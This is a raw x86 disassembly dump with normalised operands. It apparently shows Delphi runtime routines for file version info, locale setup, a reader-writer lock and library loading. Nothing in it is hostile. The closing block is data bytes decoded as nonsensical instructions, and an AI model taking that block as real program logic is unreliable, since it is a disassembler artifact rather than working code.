push ebp
push sub_40c01e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404040
lea eax [ ebp - 0x8 ]
call j_sub_404474
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404468
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c025
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c001
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_404468
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c034
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c0ac
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_404468
mov edx esi
dec edx
call sub_40c034
sub_40c0e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404268
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c110
pop esi
pop ebx
retn
mov eax ebx
call sub_404268
mov esi eax
sub_40c110
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_404268
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c320
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c168
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_404268
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c320
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c320
dec eax
mov ebx eax
sub_40c1f8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404268
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c168
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_404268
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c25c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_404268
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_404268
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c168
mov eax esi
call sub_404268
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_404268
mov [ esp ] eax
jmp r-xdata
sub_40c2e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_404468
add eax esi
dec eax
call sub_40c2bc
sub_40c320
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_404468
add eax ebx
dec eax
call sub_40c2bc
add eax ebx
sub_40c35c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_404268
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c0ac
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c390
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
xor ebx ebx
test edi edi
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404268
cmp edi eax
jg r-xdata
mov edx edi
mov eax esi
call sub_40c0ac
test al al
jne r-xdata
mov eax ebp
call sub_404468
mov dl [ esi + edi - 0x1 ]
call sub_408860
test eax eax
setne bl
sub_40c3d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403ffc
mov eax [ ebx ]
call sub_404268
mov edx eax
mov eax [ ebx ]
call sub_40c35c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_404270
sub_40c414
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_404468
push eax
mov eax esi
call sub_404468
mov ebp eax
mov eax ebp
pop edx
call sub_40c4d8
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c44c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407d74
mov eax esi
call sub_404268
mov ebp eax
mov eax edi
mov edx ebp
call sub_4045f4
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404474#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404474#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404474#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c4d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4086dc
mov [ esp ] eax
mov eax ebp
call sub_4086dc
mov edi eax
mov edx ebp
mov eax esi
call sub_408874
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c0d0
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408874
mov ebx eax
inc ebx
sub_40c578
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c5a0
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c5a0
test eax eax
jne r-xdata
sub_40c5a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408860
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c0d0
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408860
mov edi eax
test edi edi
jne r-xdata
sub_40c5e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c644
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404218
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4080c8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c64b
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_40c654
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c5e0
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c6cc
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c6b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c654
pop ecx
push ebp
call sub_40c654
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d88
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c840
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cb0b
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c6cc
call sub_40afec
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40af3c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ffc
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4080c8
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4080c8
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40af88
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40af88
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4080c8
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40af88
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b274
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403ffc
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b274
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403ffc
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40af88
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40af3c
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403ffc
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40af3c
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403ffc
lea eax [ ebp - 0x8 ]
call sub_403fa8
lea eax [ ebp - 0xc ]
call sub_403fa8
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4080c8
test eax eax
jne r-xdata
call sub_40b1c4
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404040
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404040
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404328
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_404328
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40af88
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb12
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403fcc
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4080c8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40af3c
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4080c8
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404040
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404040
jmp r-xdata
sub_40cbb8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40ccdb
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404040
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404040
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_407d40
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407d40
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404040
mov eax esi
call sub_403fa8
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c414
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cce2
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fcc
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044c8
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_404328
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_404268
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_4044c8
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404270
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404268
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_4044c8
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404270
jmp r-xdata
sub_40ccf4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cd84
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40aef0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd8b
lea eax [ ebp - 0x14 ]
call sub_403fa8
retn
sub_40cddc
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408668
mov [ rw-data ] eax
sub_40ce60
push ebx
push esi
push edi
push ebp
call sub_4035e4
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403248
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035cc
sub_40cec8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40ceb0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cf50
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407b7c
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40ce50
mov [ ebp ] eax
sub_40cf50
push ebx
mov ebx eax
mov eax ebx
call sub_40ceb0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40ce50
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cf90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_40d004
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_40d090
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_40d090
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d04c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40cec8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40ce58
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40ce38
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40ce58
test eax eax
je r-xdata
mov eax edi
call sub_40d04c
test bl bl
je r-xdata
mov eax edi
call sub_40d080
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40ce38
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40ce44
sub_40d12c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cec8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40ce58
mov eax ebx
call sub_40d064
mov eax ebx
call sub_40d058
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cf40
sub_40d17c
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40cec8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d070
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40ce44
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40ce38
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d070
mov eax esi
call sub_40d064
sub_40d1e8
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cec8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cf40
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40ce38
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d064
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d064
sub_40d260
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d284
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d2fb
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4056c4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d302
lea eax [ ebp - 0x4 ]
call sub_4056c4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_40330c
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d260
test al al
jne r-xdata
mov al 0x1
sub_40d31c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d38e
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d370
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404468
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d377
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d591
inc edi
add [ eax ] al
add [ eax ] al
add ah al
and [ edi ] eax
or al 0x3e
inc edi
add [ eax ] al
add [ eax ] al
add al al
and [ edi ] eax
adc al 0x3d
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x3b480047 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffb8df ] bh
cmp eax 0x47
add [ eax ] al
mov ah 0x21
inc edi
add [ eax ] bh
inc eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb8df ] dh
aas
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x3e680047 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004721 ] ch
cmp al 0x47
add [ eax ] al
add [ eax ] al
add [ ecx + 0x3b600047 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x43ffb8df ] ah
aas
inc edi
add [ eax ] al
add [ eax ] al
